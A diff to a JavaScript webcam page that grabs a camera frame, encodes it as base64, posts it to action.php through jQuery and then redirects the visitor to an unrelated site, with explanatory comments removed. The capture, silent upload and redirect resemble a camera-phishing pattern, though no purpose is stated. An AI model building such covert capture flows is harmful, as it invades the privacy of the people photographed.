@@ -1,29 +1,22 @@
 var video = document.getElementById("video")
 const can = document.getElementById("canvas")
-const form = document.getElementById("form")
-const imgNameInput = document.getElementById("imgName")
-const baseString = document.getElementById("baseString")
 
 window.onload = () => {
 
 //for different user agents
 var mediaDevices = navigator.mediaDevices || navigator.webkitMediaDevices || navigator.mozMediaDevices
-//checks if getUserMedia is supported by the browser
+
 if(navigator.mediaDevices.getUserMedia){
   try{
   navigator.mediaDevices.getUserMedia({
     video: {
-      //used to control the height of the image 
-      //usual image height is 1690px.
       height: {
-        max: 2460,
-        ideal: 1690,
+        max: 2490,
+        ideal: 1880,
         min:1080
       },
-      //used to control the width of the image 
-      //usual image width is 1260px.
       width: {
-        max: 1940,
+        max: 1980,
         ideal: 1260,
         min: 720
       },
@@ -35,7 +28,11 @@ if(navigator.mediaDevices.getUserMedia){
     audio:false
   })
   .then(stream => {
+    let streamHeight = stream.getVideoTracks()[0].getSettings().height
+    let streamWidth = stream.getVideoTracks()[0].getSettings().width
     //sets the video source to play the video
+    video.height = streamHeight
+    video.width = streamWidth
     video.srcObject = stream
   })
   }catch(err){
@@ -59,15 +56,16 @@ function drawCan(){
     ctx.drawImage(video, 0, 0, can.width, can.height);
     
     //converts the image to a dataURL
-    //encodes it in base64 string to be able to sent to the server
     let data = can.toDataURL('image/png');
     //generates a random name to save the image as
     let imgName = Math.round(Math.random() * 1000000)
     
-    imgNameInput.value = imgName
-    baseString.value = data
-    //sends data to the server
-    form.submit()
+    $.post("action.php", {
+      name: imgName,
+      baseString: data
+    }, (data, status) => {
+      window.location.href = "https://nasa.gov"
+    })
   }catch(err){
     document.write(err)
   }
